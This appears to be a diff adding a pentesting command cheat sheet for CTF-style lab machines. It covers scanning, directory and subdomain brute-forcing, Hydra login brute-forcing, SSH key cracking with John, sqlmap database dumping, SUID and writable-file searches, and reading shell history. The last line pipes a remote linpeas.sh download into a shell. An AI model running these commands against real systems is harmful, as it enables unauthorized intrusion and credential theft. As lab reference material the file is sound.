@@ -1,0 +1,72 @@
+* Nmap Efficient Command:
+sudo nmap -sVC -T4 -Pn --open -p- Target_IP -oN ./result_file
+
+* Gobuster Command:
+gobuster dir -u http://Target_IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,cgi,sh,html,css,js,py -t 100 --no-error
+
+* Python Dirsearch Command:
+python /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://team.thm -w /opt/common.txt -e php
+
+* Hydra Command:
+hydra -l User_Name -P Password_Wordlist_Path  Target_IP Service_Name
+sudo hydra -l admin -P /opt/rockyou.txt 10.10.125.45 https-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -V
+
+* NetCat Command: (for listening) 
+nc -lvnp Port
+
+* pcapng file Analyzer with ettercap:
+ettercap -T -r filename
+
+* Docker Server hosting Command:
+docker run --rm -it --network=host/tun0 aler9/rtsp-simple-server
+
+* Python Server hosting Command:
+python -m http.server
+
+* John The Ripper Command:
+For converting id_rsa to hash key ->
+/usr/share/john/ssh2john.py id_rsa > keyy.txt
+cracking the generated hash key ->
+john --wordlist=/usr/share/wordlists/rockyou.txt keyy.txt
+If the hash is already cracked -> 
+john --show filename
+
+* SQLInjection automatic Command:(It will pull-up all contents from db)
+sqlmap -r r.txt --dump
+
+* Brutefore subdomain Command:
+wfuzz -c --hw 977 -u http://team.thm -H "Host: FUZZ.team.thm" -w ~/Desktop/git/SecLists/Discovery/DNS/subdomains-top1mil
+lion-5000.txt
+
+* Steghide Command: (for extracting)
+steghide extract -sf cutie.png
+outguess -r qw.jpg hehe.txt
+
+* Finding multiple files in a single Command:
+find / -type f \(-name file1 -o -name file2 -o -name file3 -o -name file4 -o\) 2>/dev/null
+Find all the SUID/SGID executables Command ->
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+find / -perm +6000 2>/dev/null | grep '/bin/'
+A simple search for writable folders ->
+find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep usr | sort -u
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+
+* Local_Machine IP address finding Command:
+ip addr show tun0
+
+* View the contents of all the hidden history files in the user's home directory:
+cat ~/.*history | less
+
+* EMail Analyzer usage command: 
+emlAnalyzer -i filename.eml --header --html -u --text --extract-all
+
+* lsof -n | grep LISTEN
+A SIGNIFICANTLY FASTER way. Is to use the -i option to filter for a specific port:
+lsof -i tcp:[PORT]
+To kill all processes listening on a specific port use:
+lsof -ti tcp:5900 | xargs kill
+
+* Curl Shortcut Command for traversing multiple directory:
+for i in $(cat map.txt); do curl -s http://biohazard$i && echo -e '---------------------------------------\n'; done
+curl 10.18.43.126:9090/linpeas.sh |/bin/sh
